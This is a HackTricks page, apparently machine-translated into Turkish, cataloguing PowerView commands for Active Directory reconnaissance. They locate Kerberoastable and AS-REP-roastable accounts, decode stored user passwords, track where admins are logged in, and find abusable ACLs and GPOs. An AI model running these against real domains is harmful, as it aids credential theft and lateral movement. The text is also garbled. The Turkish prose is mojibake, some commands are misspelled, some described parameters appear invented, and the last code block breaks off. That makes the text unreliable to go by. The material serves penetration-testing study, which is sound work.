# PowerView/SharpView

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

* Bir **cybersecurity ÅŸirketinde** Ã§alÄ±ÅŸÄ±yor musunuz? **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** ister misiniz? veya **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu keÅŸfedin
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter**'da takip edin ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

PowerView'Ä±n en gÃ¼ncel sÃ¼rÃ¼mÃ¼ her zaman PowerSploit'in dev dalÄ±nda bulunur: [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

[**SharpView**](https://github.com/tevora-threat/SharpView), [**PowerView**](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)'Ä±n .NET portudur.

### HÄ±zlÄ± numaralandÄ±rma
```powershell
Get-NetDomain #Basic domain info
#User info
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount #Basic user enabled info
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN #Kerberoastable users
#Groups info
Get-NetGroup | select samaccountname, admincount, description
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName #Get AdminSDHolders
#Computers
Get-NetComputer | select samaccountname, operatingsystem
Get-NetComputer -Unconstrainusered | select samaccountname #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth | select samaccountname #Find computers with Constrained Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups
#Shares
Find-DomainShare -CheckShareAccess #Search readable shares
#Domain trusts
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
#LHF
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess
#Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
Invoke-UserHunter -CheckAccess
#Find interesting ACLs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl
```
### Alan Bilgisi

PowerView, bir etki alanÄ± hakkÄ±nda bilgi toplamak iÃ§in kullanÄ±lan bir PowerShell modÃ¼lÃ¼dÃ¼r. AÅŸaÄŸÄ±daki komutlar, etki alanÄ± hakkÄ±nda Ã§eÅŸitli bilgileri elde etmek iÃ§in kullanÄ±labilir:

- `Get-Domain`: Etki alanÄ± hakkÄ±nda genel bilgileri alÄ±r.
- `Get-DomainController`: Etki alanÄ± denetleyicileri hakkÄ±nda bilgi saÄŸlar.
- `Get-DomainTrust`: Etki alanÄ± gÃ¼ven iliÅŸkileri hakkÄ±nda bilgi verir.
- `Get-DomainPolicy`: Etki alanÄ± politikalarÄ± hakkÄ±nda bilgi saÄŸlar.
- `Get-DomainGroup`: Etki alanÄ± gruplarÄ± hakkÄ±nda bilgi verir.
- `Get-DomainUser`: Etki alanÄ± kullanÄ±cÄ±larÄ± hakkÄ±nda bilgi saÄŸlar.
- `Get-DomainComputer`: Etki alanÄ± bilgisayarlarÄ± hakkÄ±nda bilgi verir.
- `Get-DomainGroupMember`: Bir grup Ã¼yeleri hakkÄ±nda bilgi saÄŸlar.
- `Get-DomainGroupMember -Identity "GrupAdÄ±" -Recurse`: Bir grup Ã¼yeleri hakkÄ±nda bilgi saÄŸlar ve alt gruplarÄ± da tarar.

Bu komutlar, bir etki alanÄ± hakkÄ±nda daha fazla bilgi edinmek ve hedef sistemleri analiz etmek iÃ§in kullanÄ±labilir.
```powershell
# Domain Info
Get-Domain #Get info about the current domain
Get-NetDomain #Get info about the current domain
Get-NetDomain -Domain mydomain.local
Get-DomainSID #Get domain SID

# Policy
Get-DomainPolicy #Get info about the policy
(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."SystemAccess" #Password policy
Get-DomainPolicyData | select -ExpandProperty SystemAccess #Same as previous
(Get-DomainPolicy).PrivilegeRights #Check your privileges
Get-DomainPolicyData # Same as Get-DomainPolicy

# Domain Controller
Get-DomainController | select Forest, Domain, IPAddress, Name, OSVersion | fl # Get specific info of current domain controller
Get-NetDomainController -Domain mydomain.local #Get all ifo of specific domain Domain Controller

# Get Forest info
Get-ForestDomain
```
### KullanÄ±cÄ±lar, Gruplar, Bilgisayarlar ve OU'lar

PowerView, etki alanÄ± kullanÄ±cÄ±larÄ±, gruplarÄ±, bilgisayarlarÄ± ve Organizasyon Birimleri (OU'lar) hakkÄ±nda bilgi toplamak iÃ§in kullanÄ±labilir. AÅŸaÄŸÄ±da, bu nesneleri sorgulamak iÃ§in kullanÄ±labilecek bazÄ± PowerView komutlarÄ± bulunmaktadÄ±r.

#### KullanÄ±cÄ±lar

- `Get-NetUser`: Etki alanÄ±ndaki kullanÄ±cÄ±larÄ± listeler.
- `Get-NetUser -Username <username>`: Belirli bir kullanÄ±cÄ±nÄ±n ayrÄ±ntÄ±larÄ±nÄ± alÄ±r.
- `Get-NetUser -GroupName <groupname>`: Belirli bir gruptaki kullanÄ±cÄ±larÄ± listeler.
- `Get-NetUser -SPN`: Service Principal Name (SPN) sahibi olan kullanÄ±cÄ±larÄ± listeler.

#### Gruplar

- `Get-NetGroup`: Etki alanÄ±ndaki gruplarÄ± listeler.
- `Get-NetGroup -GroupName <groupname>`: Belirli bir grubun ayrÄ±ntÄ±larÄ±nÄ± alÄ±r.
- `Get-NetGroup -Member <username>`: Belirli bir kullanÄ±cÄ±nÄ±n Ã¼ye olduÄŸu gruplarÄ± listeler.

#### Bilgisayarlar

- `Get-NetComputer`: Etki alanÄ±ndaki bilgisayarlarÄ± listeler.
- `Get-NetComputer -ComputerName <computername>`: Belirli bir bilgisayarÄ±n ayrÄ±ntÄ±larÄ±nÄ± alÄ±r.
- `Get-NetComputer -SPN`: Service Principal Name (SPN) sahibi olan bilgisayarlarÄ± listeler.

#### Organizasyon Birimleri (OU'lar)

- `Get-NetOU`: Etki alanÄ±ndaki OU'larÄ± listeler.
- `Get-NetOU -OUName <ouname>`: Belirli bir OU'nun ayrÄ±ntÄ±larÄ±nÄ± alÄ±r.
- `Get-NetOU -ComputerName <computername>`: Belirli bir bilgisayarÄ±n bulunduÄŸu OU'larÄ± listeler.

Bu komutlar, etki alanÄ± Ã¼zerindeki kullanÄ±cÄ±lar, gruplar, bilgisayarlar ve OU'lar hakkÄ±nda bilgi toplamak iÃ§in kullanÄ±labilir.
```powershell
# Users
## Get usernames and their groups
Get-DomainUser -Properties name, MemberOf | fl
## Get-DomainUser and Get-NetUser are kind of the same
Get-NetUser #Get users with several (not all) properties
Get-NetUser | select samaccountname, description, pwdlastset, logoncount, badpwdcount #List all usernames
Get-NetUser -UserName student107 #Get info about a user
Get-NetUser -properties name, description #Get all descriptions
Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount  #Get all pwdlastset, logoncount and badpwdcount
Find-UserField -SearchField Description -SearchTerm "built" #Search account with "something" in a parameter
# Get users with reversible encryption (PWD in clear text with dcsync)
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

# Users Filters
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname #All enabled users
Get-NetUser -UACFilter ACCOUNTDISABLE #All disabled users
Get-NetUser -UACFilter SMARTCARD_REQUIRED #Users that require a smart card
Get-NetUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname #Not smart card users
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Get-Netuser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto #Constrained Resource Delegation
Get-NetUser -AllowDelegation -AdminCount #All privileged users that aren't marked as sensitive/not for delegation
# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}
# Users with PASSWD_NOTREQD set in the userAccountControl means that the user is not subject to the current password policy
## Users with this flag might have empty passwords (if allowed) or shorter passwords
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

#Groups
Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName
## Get-DomainGroup is similar to Get-NetGroup
Get-NetGroup #Get groups
Get-NetGroup -Domain mydomain.local #Get groups of an specific domain
Get-NetGroup 'Domain Admins' #Get all data of a group
Get-NetGroup -AdminCount | select name,memberof,admincount,member | fl #Search admin grups
Get-NetGroup -UserName "myusername" #Get groups of a user
Get-NetGroupMember -Identity "Administrators" -Recurse #Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups also
Get-NetGroupMember -Identity "Enterprise Admins" -Domain mydomain.local #Remember that "Enterprise Admins" group only exists in the rootdomain of the forest
Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups #Get Local groups of a machine (you need admin rights in no DC hosts)
Get-NetLocalGroupMember -computername dcorp-dc.dollarcorp.moneycorp.local #Get users of localgroups in computer
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs #Check AdminSDHolder users
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} #Get ObjectACLs by sid
Get-NetGPOGroup #Get restricted groups

# Computers
Get-DomainComputer -Properties DnsHostName # Get all domain maes of computers
## Get-DomainComputer is kind of the same as Get-NetComputer
Get-NetComputer #Get all computer objects
Get-NetComputer -Ping #Send a ping to check if the computers are working
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth #Find computers with Constrined Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups

#OU
Get-DomainOU -Properties Name | sort -Property Name #Get names of OUs
Get-DomainOU "Servers" | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties Name} #Get all computers inside an OU (Servers in this case)
## Get-DomainOU is kind of the same as Get-NetOU
Get-NetOU #Get Organization Units
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_} #Get all computers inside an OU (StudentMachines in this case)
```
### Oturum AÃ§ma ve Oturumlar

PowerView, etkin oturumlarÄ± ve oturum aÃ§ma bilgilerini elde etmek iÃ§in kullanÄ±labilir. AÅŸaÄŸÄ±da, bu iÅŸlemleri gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±lan bazÄ± PowerView komutlarÄ± bulunmaktadÄ±r.

#### Get-NetLoggedon

Bu komut, etkin oturum aÃ§ma bilgilerini elde etmek iÃ§in kullanÄ±lÄ±r. AÅŸaÄŸÄ±daki komutu kullanarak etkin oturum aÃ§ma bilgilerini alabilirsiniz:

```powershell
Get-NetLoggedon
```

#### Get-NetSession

Bu komut, etkin oturumlarÄ± elde etmek iÃ§in kullanÄ±lÄ±r. AÅŸaÄŸÄ±daki komutu kullanarak etkin oturumlarÄ± alabilirsiniz:

```powershell
Get-NetSession
```

#### Get-NetSession -ComputerName <computername>

Bu komut, belirli bir bilgisayardaki etkin oturumlarÄ± elde etmek iÃ§in kullanÄ±lÄ±r. `<computername>` parametresini hedef bilgisayarÄ±n adÄ±yla deÄŸiÅŸtirerek kullanabilirsiniz.

```powershell
Get-NetSession -ComputerName <computername>
```

#### Get-NetSession -UserName <username>

Bu komut, belirli bir kullanÄ±cÄ±nÄ±n etkin oturumlarÄ±nÄ± elde etmek iÃ§in kullanÄ±lÄ±r. `<username>` parametresini hedef kullanÄ±cÄ±nÄ±n adÄ±yla deÄŸiÅŸtirerek kullanabilirsiniz.

```powershell
Get-NetSession -UserName <username>
```

#### Get-NetSession -ComputerName <computername> -UserName <username>

Bu komut, belirli bir bilgisayardaki belirli bir kullanÄ±cÄ±nÄ±n etkin oturumlarÄ±nÄ± elde etmek iÃ§in kullanÄ±lÄ±r. `<computername>` parametresini hedef bilgisayarÄ±n adÄ±yla, `<username>` parametresini hedef kullanÄ±cÄ±nÄ±n adÄ±yla deÄŸiÅŸtirerek kullanabilirsiniz.

```powershell
Get-NetSession -ComputerName <computername> -UserName <username>
```

#### Get-NetSession -ComputerName <computername> -Domain <domainname>

Bu komut, belirli bir etki alanÄ±ndaki belirli bir bilgisayardaki etkin oturumlarÄ± elde etmek iÃ§in kullanÄ±lÄ±r. `<computername>` parametresini hedef bilgisayarÄ±n adÄ±yla, `<domainname>` parametresini hedef etki alanÄ±nÄ±n adÄ±yla deÄŸiÅŸtirerek kullanabilirsiniz.

```powershell
Get-NetSession -ComputerName <computername> -Domain <domainname>
```

#### Get-NetSession -ComputerName <computername> -Domain <domainname> -UserName <username>

Bu komut, belirli bir etki alanÄ±ndaki belirli bir bilgisayardaki belirli bir kullanÄ±cÄ±nÄ±n etkin oturumlarÄ±nÄ± elde etmek iÃ§in kullanÄ±lÄ±r. `<computername>` parametresini hedef bilgisayarÄ±n adÄ±yla, `<domainname>` parametresini hedef etki alanÄ±nÄ±n adÄ±yla, `<username>` parametresini hedef kullanÄ±cÄ±nÄ±n adÄ±yla deÄŸiÅŸtirerek kullanabilirsiniz.

```powershell
Get-NetSession -ComputerName <computername> -Domain <domainname> -UserName <username>
```
```powershell
Get-NetLoggedon -ComputerName <servername> #Get net logon users at the moment in a computer (need admins rights on target)
Get-NetSession -ComputerName <servername> #Get active sessions on the host
Get-LoggedOnLocal -ComputerName <servername> #Get locally logon users at the moment (need remote registry (default in server OS))
Get-LastLoggedon -ComputerName <servername> #Get last user logged on (needs admin rigths in host)
Get-NetRDPSession -ComputerName <servername> #List RDP sessions inside a host (needs admin rights in host)
```
### Grup Ä°lkesi Nesnesi - GPO'lar

Bir saldÄ±rganÄ±n **yÃ¼ksek ayrÄ±calÄ±klara sahip bir GPO** Ã¼zerinde kontrolÃ¼ varsa, bunu istismar ederek bir kullanÄ±cÄ±ya **izinler ekleyebilir**, bir makineye **yerel yÃ¶netici kullanÄ±cÄ±sÄ± ekleyebilir** veya bir eylem gerÃ§ekleÅŸtirmek iÃ§in (hemen) bir **zamanlanmÄ±ÅŸ gÃ¶rev oluÅŸturabilir**.\
Daha fazla bilgi ve bunu nasÄ±l istismar edeceÄŸiniz hakkÄ±nda [**bu baÄŸlantÄ±yÄ± takip edin**](../active-directory-methodology/acl-persistence-abuse/#gpo-delegation).
```powershell
#GPO
Get-DomainGPO | select displayName #Check the names for info
Get-NetGPO #Get all policies with details
Get-NetGPO | select displayname #Get the names of the policies
Get-NetGPO -ComputerName <servername> #Get the policy applied in a computer
gpresult /V #Get current policy

# Get who can create new GPOs
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=invented,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Enumerate permissions for GPOs where users with RIDs of > 1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Get permissions a user/group has over any GPO
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# COnvert GPO GUID to name
Get-GPO -Guid 18E5A689-E67F-90B2-1953-198ED4A7F532

# Transform SID to name
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126

# Get GPO of an OU
Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'

# Returns all GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences.
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName, GPOType

# Enumerates the machines where a specific domain user/group is a member of a specific local group.
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
```
### ACL (EriÅŸim Kontrol Listesi) 

ACL'ler, bir nesnenin (dosya, klasÃ¶r, kaynak vb.) Ã¼zerindeki eriÅŸim izinlerini kontrol etmek iÃ§in kullanÄ±lan bir mekanizmadÄ±r. ACL'ler, kullanÄ±cÄ±larÄ±n veya gruplarÄ±n bir nesneye eriÅŸim dÃ¼zeyini belirlemek iÃ§in kullanÄ±lÄ±r. ACL'ler, nesnelerin Ã¼zerindeki izinleri tanÄ±mlayan bir dizi giriÅŸ iÃ§erir.

ACL'ler, iki temel bileÅŸenden oluÅŸur:

- **GÃ¼venlik TanÄ±mlayÄ±cÄ±larÄ± (Security Identifiers - SIDs):** KullanÄ±cÄ±larÄ±, gruplarÄ± veya bilgisayarlarÄ± temsil eden benzersiz kimliklerdir.
- **Ä°zinler:** Bir nesneye eriÅŸim dÃ¼zeyini belirleyen izinlerdir. Ä°zinler, okuma, yazma, deÄŸiÅŸtirme, silme vb. gibi Ã§eÅŸitli iÅŸlemleri iÃ§erebilir.

ACL'ler, nesnelerin Ã¼zerindeki izinleri kontrol etmek iÃ§in kullanÄ±lan bir dizi kurala sahiptir. Bu kurallar, izinleri uygulamak veya reddetmek iÃ§in kullanÄ±lÄ±r. ACL'ler, bir nesnenin Ã¼zerindeki izinleri deÄŸiÅŸtirmek veya manipÃ¼le etmek iÃ§in kullanÄ±labilecek birÃ§ok farklÄ± yÃ¶ntem sunar.

ACL'ler, bir saldÄ±rganÄ±n bir nesneye eriÅŸim izinlerini kÃ¶tÃ¼ye kullanmasÄ±na olanak tanÄ±r. Bu, saldÄ±rganÄ±n yetkisiz eriÅŸim elde etmek, veri sÄ±zdÄ±rmak veya sistemdeki diÄŸer kÃ¶tÃ¼ niyetli faaliyetleri gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±labilir.
```powershell
#Get ACLs of an object (permissions of other objects over the indicated one)
Get-ObjectAcl -SamAccountName <username> -ResolveGUIDs

#Other way to get ACLs of an object
$sid = Convert-NameToSid <username/group>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

#Get permissions of a file
Get-PathAcl -Path "\\dc.mydomain.local\sysvol"

#Find intresting ACEs (Interesting permisions of "unexpected objects" (RID>1000 and modify permissions) over other objects
Find-InterestingDomainAcl -ResolveGUIDs

#Check if any of the interesting permissions founds is realated to a username/group
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}

#Get special rights over All administrators in domain
Get-NetGroupMember -GroupName "Administrators" -Recurse | ?{$_.IsGroup -match "false"} | %{Get-ObjectACL -SamAccountName $_.MemberName -ResolveGUIDs} | select ObjectDN, IdentityReference, ActiveDirectoryRights
```
### PaylaÅŸÄ±lan dosyalar ve klasÃ¶rler

PowerView, aÄŸdaki paylaÅŸÄ±lan dosyalarÄ± ve klasÃ¶rleri keÅŸfetmek iÃ§in kullanÄ±labilir. AÅŸaÄŸÄ±daki komutlarla bu bilgilere eriÅŸebilirsiniz:

- `Get-NetShare`: AÄŸdaki paylaÅŸÄ±lan dosya ve klasÃ¶rleri listeler.
- `Get-NetFile`: AÄŸdaki aÃ§Ä±k dosyalarÄ± listeler.
- `Get-NetSession`: AÄŸdaki oturumlarÄ± listeler.
- `Get-NetLoggedon`: AÄŸdaki oturum aÃ§Ä±k olan kullanÄ±cÄ±larÄ± listeler.

Bu komutlar, aÄŸdaki paylaÅŸÄ±lan dosyalarÄ± ve klasÃ¶rleri belirlemek ve aÄŸdaki kullanÄ±cÄ±larÄ±n oturum durumunu kontrol etmek iÃ§in kullanÄ±ÅŸlÄ±dÄ±r. Bu bilgiler, bir saldÄ±rganÄ±n aÄŸda gezinmesine ve hassas verilere eriÅŸmesine yardÄ±mcÄ± olabilir.
```powershell
Get-NetFileServer #Search file servers. Lot of users use to be logged in this kind of servers
Find-DomainShare -CheckShareAccess #Search readable shares
Find-InterestingDomainShareFile #Find interesting files, can use filters
```
### Etki AlanÄ± GÃ¼veni

Domain trust refers to the relationship established between two domains in a Windows Active Directory environment. It allows users from one domain to access resources in another domain without having to create separate user accounts. Domain trust can be either one-way or two-way.

Etki alanÄ± gÃ¼veni, Windows Active Directory ortamÄ±nda iki etki alanÄ± arasÄ±nda kurulan iliÅŸkiyi ifade eder. Bu, bir etki alanÄ±ndaki kullanÄ±cÄ±larÄ±n baÅŸka bir etki alanÄ±ndaki kaynaklara ayrÄ± kullanÄ±cÄ± hesaplarÄ± oluÅŸturmadan eriÅŸmelerine olanak tanÄ±r. Etki alanÄ± gÃ¼veni tek yÃ¶nlÃ¼ veya Ã§ift yÃ¶nlÃ¼ olabilir.

#### One-Way Trust

In a one-way trust, Domain A trusts Domain B, allowing users from Domain B to access resources in Domain A. However, users from Domain A cannot access resources in Domain B unless explicitly granted permission.

Tek yÃ¶nlÃ¼ gÃ¼ven durumunda, Etki AlanÄ± A, Etki AlanÄ± B'ye gÃ¼venir ve Etki AlanÄ± B'deki kullanÄ±cÄ±larÄ±n Etki AlanÄ± A'daki kaynaklara eriÅŸmesine izin verir. Ancak, Etki AlanÄ± A'daki kullanÄ±cÄ±lar, aÃ§Ä±kÃ§a izin verilmedikÃ§e Etki AlanÄ± B'deki kaynaklara eriÅŸemez.

#### Two-Way Trust

In a two-way trust, both Domain A and Domain B trust each other, allowing users from both domains to access resources in the other domain. This provides a higher level of flexibility and collaboration between the two domains.

Ã‡ift yÃ¶nlÃ¼ gÃ¼ven durumunda, Etki AlanÄ± A ve Etki AlanÄ± B birbirlerine gÃ¼venir ve her iki etki alanÄ±ndaki kullanÄ±cÄ±larÄ±n diÄŸer etki alanÄ±ndaki kaynaklara eriÅŸmesine izin verir. Bu, iki etki alanÄ± arasÄ±nda daha yÃ¼ksek bir esneklik ve iÅŸbirliÄŸi saÄŸlar.

#### Trust Types

There are different types of trust relationships that can be established between domains, including:

- Parent-Child Trust: This is a one-way trust where a parent domain trusts its child domain.
- Tree Root Trust: This is a one-way trust where the root domain of a tree trusts another domain.
- Shortcut Trust: This is a one-way trust that allows for a shorter trust path between two domains in a forest.
- External Trust: This is a one-way or two-way trust between domains in different forests.
- Realm Trust: This is a one-way or two-way trust between a Windows domain and a non-Windows Kerberos realm.

#### Trust Enumeration

To enumerate domain trusts in a Windows environment, the PowerView tool can be used. The `Get-NetDomainTrust` cmdlet can be used to retrieve information about the trust relationships between domains.

Etki alanÄ± gÃ¼venlerini bir Windows ortamÄ±nda sÄ±ralamak iÃ§in PowerView aracÄ± kullanÄ±labilir. `Get-NetDomainTrust` cmdlet'i, etki alanlarÄ± arasÄ±ndaki gÃ¼ven iliÅŸkileri hakkÄ±nda bilgi almak iÃ§in kullanÄ±labilir.
```powershell
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-DomainTrust #Same
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
Get-DomainTrustMapping #Enumerate also all the trusts

Get-ForestDomain # Get basic forest info
Get-ForestGlobalCatalog #Get info of current forest (no external)
Get-ForestGlobalCatalog -Forest external.domain #Get info about the external forest (if possible)
Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)"

Get-NetForestTrust #Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)

Get-DomainForeingUser #Get users with privileges in other domains inside the forest
Get-DomainForeignGroupMember #Get groups with privileges in other domains inside the forest
```
### Kolay Hedefler

Bu bÃ¶lÃ¼mde, hedef sistemdeki dÃ¼ÅŸÃ¼k seviyeli zayÄ±flÄ±klarÄ± hedefleyen basit saldÄ±rÄ± tekniklerini ele alacaÄŸÄ±z. Bu tÃ¼r zayÄ±flÄ±klar genellikle kolayca sÃ¶mÃ¼rÃ¼lebilir ve hedef sistemdeki gÃ¼venlik dÃ¼zeyini dÃ¼ÅŸÃ¼rebilir. AÅŸaÄŸÄ±da, bu tÃ¼r saldÄ±rÄ± tekniklerinin bazÄ± Ã¶rneklerini bulabilirsiniz:

- ZayÄ±f parolalar: KullanÄ±cÄ±larÄ±n zayÄ±f veya tahmin edilebilir parolalar kullanmasÄ±, saldÄ±rganlarÄ±n hedef sistemlere kolayca eriÅŸmesini saÄŸlayabilir.
- GÃ¼ncellenmemiÅŸ yazÄ±lÄ±mlar: GÃ¼ncellenmemiÅŸ yazÄ±lÄ±mlar, bilinen zayÄ±flÄ±klara sahip olabilir ve saldÄ±rganlarÄ±n hedef sistemlere sÄ±zmasÄ±nÄ± kolaylaÅŸtÄ±rabilir.
- YanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ izinler: YanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ dosya veya klasÃ¶r izinleri, saldÄ±rganlarÄ±n hedef sistemdeki hassas verilere eriÅŸmesini saÄŸlayabilir.
- Sosyal mÃ¼hendislik: SaldÄ±rganlar, kullanÄ±cÄ±larÄ± manipÃ¼le ederek veya yanÄ±ltarak hedef sistemlere eriÅŸebilir.

Bu tÃ¼r dÃ¼ÅŸÃ¼k seviyeli zayÄ±flÄ±klar, saldÄ±rganlar iÃ§in kolay hedefler olabilir ve genellikle baÅŸarÄ±lÄ± saldÄ±rÄ±lar iÃ§in ilk adÄ±mlarÄ± oluÅŸtururlar. Bu nedenle, hedef sistemlerin bu tÃ¼r zayÄ±flÄ±klardan korunmasÄ± Ã¶nemlidir.
```powershell
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl

#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess

#(This time you need to give the list of computers in the domain) Do the same as before but trying to execute a WMI action in each computer (admin privs are needed to do so). Useful if RCP and SMB ports are closed.
.\Find-WMILocalAdminAccess.ps1 -ComputerFile .\computers.txt

#Enumerate machines where a particular user/group identity has local admin rights
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>

# Enumerates the members of specified local group (default administrators)
# for all the targeted machines on the current (or specified) domain.
Invoke-EnumerateLocalAdmin
Find-DomainLocalGroupMember

#Search unconstrained delegation computers and show users
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

#Admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation

#Get members from Domain Admins (default) and a list of computers
# and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host.
# If -Checkaccess, then it also check for LocalAdmin access in the hosts.
## By default users inside Domain Admins are searched
Find-DomainUserLocation [-CheckAccess] | select UserName, SessionFromName
Invoke-UserHunter [-CheckAccess]

#Search "RDPUsers" users
Invoke-UserHunter -GroupName "RDPUsers"

#It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)
Invoke-UserHunter -Stealth
```
### Silinen nesneler

Silinen nesneler, Active Directory ortamÄ±nda silinmiÅŸ ancak tamamen kaldÄ±rÄ±lmamÄ±ÅŸ nesneleri ifade eder. Bu nesneler, geri yÃ¼klenebilir veya geri getirilebilir. PowerShell ile silinen nesneleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `Get-ADObject` komutunu kullanabilirsiniz.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
```

Bu komut, silinen nesneleri filtreleyerek ve dahil ederek gÃ¶rÃ¼ntÃ¼ler.
```powershell
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the AD Recycle Bin group of the AD to list the deleted AD objects
